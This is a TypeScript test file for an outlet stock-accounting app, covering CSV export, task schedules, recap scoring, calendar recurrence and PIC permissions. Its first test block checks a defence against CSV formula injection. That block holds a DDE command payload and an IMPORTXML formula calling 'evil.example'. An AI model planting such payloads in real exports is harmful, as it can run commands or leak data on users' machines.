import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  DEFAULT_ROLE_CONFIGS,
  STOCK_ACCOUNTING_OUTLETS,
  STOCK_ACCOUNTING_TASKS,
  buildMonthWorkingDays,
  buildOutletsByPicMap,
  calcRecap,
  calcTask,
  canAccountEditPic,
  escapeCsv,
  expandCalendarEventsForRange,
  formatTaskScheduleLabel,
  generateDailyFleetCsv,
  getActiveTasksForDay,
  getTaskQuickSetTargetDate,
  isScheduledTaskExpired,
  isTaskActiveOnDay,
  nextDateForWeekday,
  sanitizeTaskDefinitions,
} from '../src/utils/outletLogic';
import {
  AccountProfile,
  CalendarEvent,
  OutletStoreState,
  TaskDefinition,
} from '../src/types/outlet';

describe('outletLogic: escapeCsv (CSV Formula Injection & formatting)', () => {
  it('prefixes formula-trigger characters with a single quote', () => {
    assert.equal(escapeCsv('=CMD|" /C calc"!A0'), `"'=CMD|"" /C calc""!A0"`);
    assert.equal(escapeCsv('=1+1'), "'=1+1");
    assert.equal(escapeCsv('+SUM(A1:A2)'), "'+SUM(A1:A2)");
    assert.equal(escapeCsv('-cmd'), "'-cmd");
    assert.equal(escapeCsv('@SUM(1,2)'), `"'@SUM(1,2)"`);
    assert.equal(escapeCsv('   =1+1'), "'   =1+1");
    assert.equal(escapeCsv('\t=HYPERLINK("http://x")'), "\"'\t=HYPERLINK(\"\"http://x\"\")\"");
  });

  it('preserves plain positive/negative numbers without quoting prefix', () => {
    assert.equal(escapeCsv(0), '0');
    assert.equal(escapeCsv(-2), '-2');
    assert.equal(escapeCsv(3), '3');
    assert.equal(escapeCsv('-5'), '-5');
    assert.equal(escapeCsv('+1.5'), '+1.5');
  });

  it('neutralizes formula injection inside generated daily CSV export', () => {
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        NKPM: {
          '2026-11-10|ham': {
            d: '2026-11-09',
            n: '=IMPORTXML("http://evil.example")',
            ts: '2026-11-10T03:00:00.000Z',
          },
        },
      },
      visit: {},
    };
    const days = buildMonthWorkingDays('2026-11');
    const csv = generateDailyFleetCsv(
      state,
      days,
      DEFAULT_ROLE_CONFIGS.stock_accounting,
      '2026-11-10',
      '2026-11-10',
      true
    );
    assert.ok(csv.includes("'=IMPORTXML"));
  });
});

describe('outletLogic: calcTask & calcRecap', () => {
  it('calculates daily_plus_1, ref_task, and memo_month accurately on target working day', () => {
    const days = buildMonthWorkingDays('2026-11');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        NKPM: {
          '2026-11-10|memo': { d: '2026-10', n: '', ts: '2026-11-10T02:00:00.000Z' },
          '2026-11-10|ham': { d: '2026-11-09', n: 'Lancar', ts: '2026-11-10T02:00:00.000Z' },
          '2026-11-10|bm': { d: '2026-11-09', n: '', ts: '2026-11-10T02:00:00.000Z' },
        },
      },
      visit: {},
    };

    // Memo: 2026-10 vs anchor 2026-11 + tol(1) = -1 + 1 = 0 -> UPDATE
    const memoRes = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-10', 'memo', '2026-11-10');
    assert.equal(memoRes.pm, 0);
    assert.equal(memoRes.pend, false);

    // HAM SPC: 2026-11-09 vs 2026-11-10 (-1 working day) + tol(1) = 0 -> UPDATE
    const hamRes = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-10', 'ham', '2026-11-10');
    assert.equal(hamRes.pm, 0);
    assert.equal(hamRes.pend, false);

    // Barang Masuk (ref_task -> ham, tol=0): 2026-11-09 vs ref 2026-11-09 = 0 -> UPDATE
    const bmRes = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-10', 'bm', '2026-11-10');
    assert.equal(bmRes.pm, 0);
    assert.equal(bmRes.pend, false);
  });

  it('supports weekly_plus_1 tasks using Monday-based ISO week arithmetic', () => {
    const weeklyTask: TaskDefinition = {
      key: 'wk_audit',
      label: 'Audit Mingguan',
      shortLabel: 'Audit Wk',
      defaultDate: '',
      inputType: 'week',
      formulaType: 'weekly_plus_1',
      toleranceOffset: 1,
      formulaNote: 'Selisih minggu terhadap tanggal kerja + 1',
    };
    const days = buildMonthWorkingDays('2026-11');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        NKPM: {
          // Work date Tue 2026-11-10 (week of 2026-11-09), filled with prev week 2026-11-02 -> -1 + 1 = 0 (UPDATE)
          '2026-11-10|wk_audit': { d: '2026-11-02', n: '', ts: '2026-11-10T03:00:00.000Z' },
          // Work date Tue 2026-11-17 (week of 2026-11-16), still inherited 2026-11-02 -> -2 + 1 = -1 (PENDING)
        },
      },
      visit: {},
    };

    const onWeekOk = calcTask(state, days, [weeklyTask], 'NKPM', '2026-11-10', 'wk_audit', '2026-11-17');
    assert.equal(onWeekOk.pm, 0);
    assert.equal(onWeekOk.pend, false);

    const nextWeekLate = calcTask(state, days, [weeklyTask], 'NKPM', '2026-11-17', 'wk_audit', '2026-11-17');
    assert.equal(nextWeekLate.pm, -1);
    assert.equal(nextWeekLate.pend, true);
    assert.equal(nextWeekLate.source, 'inherited');
    assert.equal(nextWeekLate.sourceDay, '2026-11-10');
  });

  it('carries over previous month entry into the next month', () => {
    const decDays = buildMonthWorkingDays('2026-12');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        DELICA: {
          '2026-11-30|ham': { d: '2026-11-30', n: '', ts: '2026-11-30T04:00:00.000Z' },
        },
      },
      visit: {},
    };
    const res = calcTask(state, decDays, STOCK_ACCOUNTING_TASKS, 'DELICA', '2026-12-01', 'ham', '2026-12-01');
    assert.equal(res.d, '2026-11-30');
    assert.equal(res.source, 'inherited');
    assert.equal(res.sourceDay, '2026-11-30');
    assert.equal(res.pm, 0);
    assert.equal(res.pend, false);
  });

  it('clamps future update dates to today and penalizes non-admin backfill', () => {
    const days = buildMonthWorkingDays('2026-11');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        NKPM: {
          // Filled for 2026-11-05 on 2026-11-10 WIB (2026-11-10T04:00Z = 11:00 WIB) -> 4 working days gap - 1 = 3 backfillDays
          '2026-11-05|ham': { d: '2026-11-05', n: '', ts: '2026-11-10T04:00:00.000Z' },
          // Admin backfill should NOT be penalized
          '2026-11-05|jual': { d: '2026-11-28', n: '', ts: '2026-11-10T04:00:00.000Z', byAdmin: true },
        },
      },
      visit: {},
    };

    const userBackfill = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-05', 'ham', '2026-11-10');
    assert.equal(userBackfill.backfillDays, 3);
    assert.equal(userBackfill.pm, -3);
    assert.equal(userBackfill.pend, true);

    const adminClamped = calcTask(state, days, STOCK_ACCOUNTING_TASKS, 'NKPM', '2026-11-05', 'jual', '2026-11-10');
    assert.equal(adminClamped.backfillDays, undefined);
    // Clamped to today (2026-11-10) vs day (2026-11-05) = +4 working days + tol(1) = +5
    assert.equal(adminClamped.pm, 5);
    assert.equal(adminClamped.pend, false);
  });

  it('computes calcRecap across a date range excluding Sundays', () => {
    const days = buildMonthWorkingDays('2026-11');
    const state: OutletStoreState = {
      start: '2026-11-02',
      ent: {
        DLS: {
          '2026-11-02|ham': { d: '2026-11-02', n: '', ts: '2026-11-02T03:00:00.000Z' },
          '2026-11-03|ham': { d: '2026-11-02', n: '', ts: '2026-11-03T03:00:00.000Z' },
          '2026-11-04|ham': { d: '2026-11-02', n: '', ts: '2026-11-04T03:00:00.000Z' },
        },
      },
      visit: {},
    };
    const recap = calcRecap(
      state,
      days,
      STOCK_ACCOUNTING_TASKS,
      'DLS',
      'PETER',
      'ham',
      '2026-11-05',
      '2026-11-05',
      '2026-11-02'
    );
    // Day 2: pm=+1, Day 3: pm=0, Day 4: pm=-1, Day 5 (inherited Nov 02): pm=-2 => sum=-2, avg=-0.5, pend=2
    assert.equal(recap.pend, 2);
    assert.equal(recap.avg, -0.5);
    assert.equal(recap.latestPm, -2);
    assert.equal(recap.latestPend, true);
    assert.equal(recap.hasAnyInput, true);
  });
});

describe('outletLogic: expandCalendarEventsForRange', () => {
  const baseEvt: CalendarEvent = {
    id: 'evt1',
    date: '2026-11-02',
    startTime: '09:00',
    title: 'Briefing Operasional',
    notes: '',
    visibleTo: ['stock_accounting', 'gl', 'accounting'],
    createdBy: 'u1',
    updatedBy: 'u1',
    createdByName: 'Admin',
    createdByEmail: 'admin@example.com',
    repeatFreq: 'none',
    repeatInterval: 1,
    repeatWeekdays: [],
    repeatUntil: '',
    excludedDates: [],
  };

  it('expands weekly events with repeatWeekdays, repeatUntil, and excludedDates', () => {
    const evt: CalendarEvent = {
      ...baseEvt,
      repeatFreq: 'weekly',
      repeatInterval: 1,
      repeatWeekdays: [1, 3], // Mon & Wed
      repeatUntil: '2026-11-11',
      excludedDates: ['2026-11-04'],
    };
    const occurrences = expandCalendarEventsForRange([evt], '2026-11-01', '2026-11-30');
    assert.deepEqual(
      occurrences.map((o) => o.occurrenceDate),
      ['2026-11-02', '2026-11-09', '2026-11-11']
    );
    assert.ok(occurrences.every((o) => o.isRecurring));
  });

  it('clamps monthly recurrence day-of-month for shorter months (e.g. Feb)', () => {
    const evt: CalendarEvent = {
      ...baseEvt,
      date: '2026-01-31',
      repeatFreq: 'monthly',
      repeatInterval: 1,
    };
    const occurrences = expandCalendarEventsForRange([evt], '2026-01-01', '2026-03-31');
    assert.deepEqual(
      occurrences.map((o) => o.occurrenceDate),
      ['2026-01-31', '2026-02-28', '2026-03-31']
    );
  });
});

describe('outletLogic: PIC ownership & permission helpers', () => {
  it('restricts non-admin accounts to their assigned PIC outlets only', () => {
    const peterAccount: Pick<AccountProfile, 'role' | 'picName' | 'name'> = {
      role: 'stock_accounting',
      picName: 'PETER',
      name: 'Peter',
    };
    const adminAccount: Pick<AccountProfile, 'role' | 'picName' | 'name'> = {
      role: 'admin',
      picName: '',
      name: 'Admin',
    };

    assert.equal(canAccountEditPic(peterAccount, STOCK_ACCOUNTING_OUTLETS, 'PETER'), true);
    assert.equal(canAccountEditPic(peterAccount, STOCK_ACCOUNTING_OUTLETS, 'peter'), true);
    assert.equal(canAccountEditPic(peterAccount, STOCK_ACCOUNTING_OUTLETS, 'MELVIN'), false);
    assert.equal(canAccountEditPic(peterAccount, STOCK_ACCOUNTING_OUTLETS, 'CHARLES'), false);
    assert.equal(canAccountEditPic(adminAccount, STOCK_ACCOUNTING_OUTLETS, 'MELVIN'), true);

    const byPic = buildOutletsByPicMap(STOCK_ACCOUNTING_OUTLETS);
    assert.deepEqual(byPic.PETER, ['NKPM', 'DELICA', 'DLS', 'NUANSA']);
    assert.equal(byPic.MELVIN.includes('NKPM'), false);
  });
});

describe('outletLogic: custom task visibility schedules (recurring & one-time)', () => {
  const baseTask: TaskDefinition = {
    key: 'custom_check',
    label: 'Cek Khusus',
    shortLabel: 'Cek Khusus',
    defaultDate: '',
    inputType: 'date',
    formulaType: 'daily_plus_1',
    toleranceOffset: 1,
    formulaNote: 'Selisih hari terhadap tanggal kerja + 1',
  };

  it('shows recurring weekday tasks only on selected weekdays and respects scheduleRepeatEnd', () => {
    const monWedTask: TaskDefinition = {
      ...baseTask,
      scheduleMode: 'weekdays',
      scheduleWeekdays: [1, 3], // Monday & Wednesday
      scheduleRepeatEnd: '2026-11-11',
    };
    assert.equal(isTaskActiveOnDay(monWedTask, '2026-11-02'), true); // Mon
    assert.equal(isTaskActiveOnDay(monWedTask, '2026-11-03'), false); // Tue
    assert.equal(isTaskActiveOnDay(monWedTask, '2026-11-04'), true); // Wed
    assert.equal(isTaskActiveOnDay(monWedTask, '2026-11-11'), true); // Wed (inclusive end)
    assert.equal(isTaskActiveOnDay(monWedTask, '2026-11-16'), false); // Mon after repeatEnd
    assert.equal(isScheduledTaskExpired(monWedTask, '2026-11-12'), true);
    assert.equal(isScheduledTaskExpired(monWedTask, '2026-11-11'), false);
    assert.ok(formatTaskScheduleLabel(monWedTask).includes('Sen, Rab'));
  });

  it('shows recurring monthly_dates tasks on target day(s) of month and clamps 31st to shorter months', () => {
    const monthlyTask: TaskDefinition = {
      ...baseTask,
      scheduleMode: 'monthly_dates',
      scheduleMonthDays: [1, 31],
    };
    assert.equal(isTaskActiveOnDay(monthlyTask, '2026-01-01'), true);
    assert.equal(isTaskActiveOnDay(monthlyTask, '2026-01-31'), true);
    assert.equal(isTaskActiveOnDay(monthlyTask, '2026-02-28'), true); // Feb clamped 31 -> 28
    assert.equal(isTaskActiveOnDay(monthlyTask, '2026-02-27'), false);
    assert.equal(isTaskActiveOnDay(monthlyTask, '2026-11-30'), true); // Nov clamped 31 -> 30
    assert.equal(isTaskActiveOnDay(monthlyTask, '2026-11-15'), false);
  });

  it('shows one-time tasks strictly on scheduled date(s) and hides them on all other days', () => {
    const onceTask: TaskDefinition = {
      ...baseTask,
      scheduleMode: 'once',
      scheduleDates: ['2026-11-28'],
    };
    assert.equal(isTaskActiveOnDay(onceTask, '2026-11-27'), false);
    assert.equal(isTaskActiveOnDay(onceTask, '2026-11-28'), true);
    assert.equal(isTaskActiveOnDay(onceTask, '2026-11-29'), false);
    assert.equal(isScheduledTaskExpired(onceTask, '2026-11-28'), false);
    assert.equal(isScheduledTaskExpired(onceTask, '2026-11-29'), true);

    const activeNov27 = getActiveTasksForDay([STOCK_ACCOUNTING_TASKS[0], onceTask], '2026-11-27');
    const activeNov28 = getActiveTasksForDay([STOCK_ACCOUNTING_TASKS[0], onceTask], '2026-11-28');
    assert.equal(activeNov27.length, 1);
    assert.equal(activeNov28.length, 2);
  });

  it('evaluates calcRecap only across active scheduled days for custom tasks', () => {
    const novDays = buildMonthWorkingDays('2026-11');
    const onceTask: TaskDefinition = {
      ...baseTask,
      key: 'audit_once',
      label: 'Audit Khusus',
      scheduleMode: 'once',
      scheduleDates: ['2026-11-20'],
    };
    const state: OutletStoreState = {
      start: '2026-11-01',
      ent: {
        DLS: {
          '2026-11-20|audit_once': { d: '2026-11-19', n: 'OK' },
        },
      },
      visit: {},
    };

    // Before target date: 0 scheduled days -> not penalized as pending
    const beforeRecap = calcRecap(
      state,
      novDays,
      [onceTask],
      'DLS',
      'PETER',
      'audit_once',
      '2026-11-19',
      '2026-11-30'
    );
    assert.equal(beforeRecap.totalDays, 0);
    assert.equal(beforeRecap.effectiveDays, 0);
    assert.equal(beforeRecap.pend, 0);
    assert.equal(beforeRecap.latestPend, false);

    // After target date (filled on time): 1 scheduled day, 0 pending, avg 0
    const afterRecap = calcRecap(
      state,
      novDays,
      [onceTask],
      'DLS',
      'PETER',
      'audit_once',
      '2026-11-28',
      '2026-11-30'
    );
    assert.equal(afterRecap.totalDays, 1);
    assert.equal(afterRecap.effectiveDays, 1);
    assert.equal(afterRecap.pend, 0);
    assert.equal(afterRecap.avg, 0);
    assert.equal(afterRecap.hasAnyInput, true);
  });

  it('sanitizes task schedule definitions cleanly and computes nextDateForWeekday', () => {
    const cleaned = sanitizeTaskDefinitions([
      {
        ...baseTask,
        scheduleMode: 'weekdays',
        scheduleWeekdays: [5, 1, 1, 0, 9], // 0 and 9 filtered out, deduped & sorted
        scheduleRepeatEnd: '2026-12-31',
      },
      {
        ...baseTask,
        key: 'empty_once',
        scheduleMode: 'once',
        scheduleDates: ['bad-date'],
      },
    ]);
    assert.equal(cleaned.length, 2);
    assert.deepEqual(cleaned[0].scheduleWeekdays, [1, 5]);
    assert.equal(cleaned[0].scheduleRepeatEnd, '2026-12-31');
    assert.equal(cleaned[1].scheduleMode, undefined); // falls back cleanly to default always

    // 2026-11-27 is Friday (5); next Monday (1) is 2026-11-30
    assert.equal(nextDateForWeekday(1, '2026-11-27'), '2026-11-30');
    assert.equal(nextDateForWeekday(5, '2026-11-27'), '2026-11-27');
  });

  it('formats calendar date box chip labels with 12-hour am/pm and Outlet-Judul Tugas', async () => {
    const {
      formatTimeAmPm,
      formatGridItemTitle,
      formatGridItemChipLabel,
    } = await import('../src/components/kalender/calendarUtils');

    assert.equal(formatTimeAmPm('08:00'), '8 am');
    assert.equal(formatTimeAmPm('10:00'), '10 am');
    assert.equal(formatTimeAmPm('10:30'), '10:30 am');
    assert.equal(formatTimeAmPm('12:00'), '12 pm');
    assert.equal(formatTimeAmPm('14:00'), '2 pm');
    assert.equal(formatTimeAmPm('14:30'), '2:30 pm');
    assert.equal(formatTimeAmPm('23:00'), '11 pm');

    const assignWithOutlet = {
      kind: 'assign' as const,
      key: 'assign_1_2026-11-28',
      occurrenceDate: '2026-11-28',
      startTime: '10:00',
      title: 'Cek Asset',
      isRecurring: false,
      event: {
        id: '1',
        title: 'Cek Asset',
        date: '2026-11-28',
        startTime: '10:00',
        visibleTo: ['stock_accounting' as const],
        notes: '',
        eventType: 'assign' as const,
        assignScope: 'pic' as const,
        assignedPic: 'PETER',
        assignedPicUpper: 'PETER',
        assignedRole: 'stock_accounting' as const,
        assignedOutlet: 'DLS',
        createdBy: 'u1',
        updatedBy: 'u1',
        createdByEmail: 'admin@example.com',
        createdByName: 'Admin',
      },
    };

    assert.equal(formatGridItemTitle(assignWithOutlet), 'DLS-Cek Asset');
    assert.equal(formatGridItemChipLabel(assignWithOutlet), '10 am DLS-Cek Asset');

    const assignWithoutOutlet = {
      ...assignWithOutlet,
      startTime: '14:00',
      title: 'Meeting',
      event: {
        ...assignWithOutlet.event,
        startTime: '14:00',
        title: 'Meeting',
        assignedOutlet: '',
      },
    };
    assert.equal(formatGridItemTitle(assignWithoutOutlet), 'Meeting');
    assert.equal(formatGridItemChipLabel(assignWithoutOutlet), '2 pm Meeting');
  });

  it('carries over uncompleted weekly scheduled task (e.g. Friday) to subsequent working days until inputted', () => {
    const novDays = buildMonthWorkingDays('2026-11');
    const fridayTask: TaskDefinition = {
      ...baseTask,
      key: 'friday_weekly',
      label: 'Rekonsiliasi Jumat',
      scheduleMode: 'weekdays',
      scheduleWeekdays: [5], // Every Friday (e.g., 2026-11-20 and 2026-11-27)
    };

    const emptyState: OutletStoreState = {
      start: '2026-11-01',
      ent: { DLS: {} },
      visit: {},
    };

    // Before the first Friday (e.g., 2026-11-05 is Thursday, before Friday 2026-11-06)
    assert.equal(isTaskActiveOnDay(fridayTask, '2026-11-05', emptyState, 'DLS'), false);

    // On Friday 2026-11-20: task is due
    assert.equal(isTaskActiveOnDay(fridayTask, '2026-11-20', emptyState, 'DLS'), true);

    // Not inputted on Friday 2026-11-20 -> carries over to Saturday 2026-11-21 and Monday 2026-11-23
    assert.equal(isTaskActiveOnDay(fridayTask, '2026-11-21', emptyState, 'DLS'), true);
    assert.equal(isTaskActiveOnDay(fridayTask, '2026-11-23', emptyState, 'DLS'), true);

    // User inputs the task on Monday 2026-11-23
    const filledOnMondayState: OutletStoreState = {
      start: '2026-11-01',
      ent: {
        DLS: {
          '2026-11-23|friday_weekly': { d: '2026-11-21', n: 'Susulan Jumat' },
        },
      },
      visit: {},
    };

    // Stays visible on Monday 2026-11-23 (the day it was inputted)
    assert.equal(isTaskActiveOnDay(fridayTask, '2026-11-23', filledOnMondayState, 'DLS'), true);
    const monCalc = calcTask(
      filledOnMondayState,
      novDays,
      [fridayTask],
      'DLS',
      '2026-11-23',
      'friday_weekly',
      '2026-11-27'
    );
    assert.equal(monCalc.d, '2026-11-21');

    // Disappears on Tuesday 2026-11-24, Wednesday 2026-11-25, Thursday 2026-11-26
    assert.equal(isTaskActiveOnDay(fridayTask, '2026-11-24', filledOnMondayState, 'DLS'), false);
    assert.equal(isTaskActiveOnDay(fridayTask, '2026-11-25', filledOnMondayState, 'DLS'), false);
    assert.equal(isTaskActiveOnDay(fridayTask, '2026-11-26', filledOnMondayState, 'DLS'), false);

    // Reappears fresh (unfilled) on the next Friday 2026-11-27
    assert.equal(isTaskActiveOnDay(fridayTask, '2026-11-27', filledOnMondayState, 'DLS'), true);
    const nextFriCalc = calcTask(
      filledOnMondayState,
      novDays,
      [fridayTask],
      'DLS',
      '2026-11-27',
      'friday_weekly',
      '2026-11-27'
    );
    assert.equal(nextFriCalc.d, '');
    assert.equal(nextFriCalc.pend, true);
  });

  it('calculates quick Set target date according to admin-configured task tolerance', () => {
    const selectedDay = '2026-11-24'; // Tuesday (working days before: Mon 23, Sat 21, Fri 20)
    const today = '2026-11-27';

    const dailyTol0: TaskDefinition = { ...baseTask, toleranceOffset: 0 };
    const dailyTol1: TaskDefinition = { ...baseTask, toleranceOffset: 1 };
    const dailyTol2: TaskDefinition = { ...baseTask, toleranceOffset: 2 };
    const dailyTol3: TaskDefinition = { ...baseTask, toleranceOffset: 3 };

    assert.equal(getTaskQuickSetTargetDate(dailyTol0, selectedDay, today), '2026-11-24');
    assert.equal(getTaskQuickSetTargetDate(dailyTol1, selectedDay, today), '2026-11-23');
    assert.equal(getTaskQuickSetTargetDate(dailyTol2, selectedDay, today), '2026-11-21'); // skips Sunday 22
    assert.equal(getTaskQuickSetTargetDate(dailyTol3, selectedDay, today), '2026-11-20');

    const weeklyTol0: TaskDefinition = {
      ...baseTask,
      inputType: 'week',
      formulaType: 'weekly_plus_1',
      toleranceOffset: 0,
    };
    const weeklyTol2: TaskDefinition = {
      ...baseTask,
      inputType: 'week',
      formulaType: 'weekly_plus_1',
      toleranceOffset: 2,
    };
    assert.equal(getTaskQuickSetTargetDate(weeklyTol0, selectedDay, today), '2026-11-23');
    assert.equal(getTaskQuickSetTargetDate(weeklyTol2, selectedDay, today), '2026-11-09');

    const monthlyTol0: TaskDefinition = {
      ...baseTask,
      inputType: 'month',
      formulaType: 'memo_month',
      toleranceOffset: 0,
    };
    const monthlyTol2: TaskDefinition = {
      ...baseTask,
      inputType: 'month',
      formulaType: 'memo_month',
      toleranceOffset: 2,
    };
    assert.equal(getTaskQuickSetTargetDate(monthlyTol0, selectedDay, today), '2026-11-01');
    assert.equal(getTaskQuickSetTargetDate(monthlyTol2, selectedDay, today), '2026-09-01');

    const refTaskTol2: TaskDefinition = {
      ...baseTask,
      formulaType: 'ref_task',
      refTaskKey: 'bm',
      toleranceOffset: 2,
    };
    assert.equal(
      getTaskQuickSetTargetDate(refTaskTol2, selectedDay, today, '2026-11-23'),
      '2026-11-20'
    );
  });
});


